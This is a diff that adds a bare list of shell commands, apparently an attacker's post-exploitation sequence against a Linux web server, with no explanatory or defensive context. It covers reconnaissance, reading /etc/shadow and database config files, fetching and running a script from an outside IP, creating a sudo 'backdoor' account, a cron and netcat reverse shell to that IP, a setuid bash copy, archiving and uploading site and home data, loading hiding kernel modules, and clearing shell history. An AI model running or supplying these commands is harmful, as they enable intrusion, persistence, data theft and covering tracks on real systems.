@@ -1,0 +1,43 @@
+id
+whoami
+uname -a
+cat /etc/os-release
+hostname
+ip a
+ifconfig
+netstat -tulnp
+ss -tulnp
+ps aux
+ls /home
+cat /etc/passwd
+cat /etc/shadow
+cat /etc/group
+find / -perm -4000 -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+sudo -l
+ls -la /var/www/html/
+ls -la /var/www/html/uploads/
+cat /var/www/html/config.php
+cat /var/www/html/db.php
+mysql -u root -p
+wget http://185.220.101.5/malware.sh -O /tmp/.update.sh
+chmod +x /tmp/.update.sh
+/tmp/.update.sh
+useradd -m -s /bin/bash backdoor
+echo 'backdoor:Cywarx@2026!' | chpasswd
+usermod -aG sudo backdoor
+cat /etc/crontab
+echo "* * * * * root bash -i >& /dev/tcp/185.220.101.5/4444 0>&1" >> /etc/crontab
+crontab -l
+mkdir -p /tmp/.hidden_dir
+cp /bin/bash /tmp/.hidden_dir/.bash_copy
+chmod +s /tmp/.hidden_dir/.bash_copy
+tar czf /tmp/.data_archive.tar.gz /var/www/html/uploads/ /etc/passwd /home/
+curl -s -X POST -F "file=@/tmp/.data_archive.tar.gz" http://185.220.101.5:8888/upload
+insmod /tmp/hide_procs.ko
+insmod /tmp/hide_files.ko
+insmod /tmp/net_backdoor.ko
+lsmod
+apt install -y netcat-traditional nmap john hydra proxychains4 socat tcpdump
+nc -e /bin/bash 185.220.101.5 4444
+history -c
